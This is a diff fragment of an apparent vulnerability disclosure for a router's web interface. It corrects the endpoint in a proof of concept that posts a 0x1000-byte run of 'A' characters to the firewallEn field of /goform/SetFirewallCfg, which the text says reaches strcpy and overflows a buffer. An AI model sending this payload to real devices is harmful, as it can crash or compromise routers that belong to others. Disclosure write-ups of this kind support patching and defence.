@@ -23,7 +23,7 @@ get value from firewallEn ,and call strcpy, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetFirewallCfg"
+url = "http://192.168.1.13/goform/SetFirewallCfg"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'firewallEn': payload})
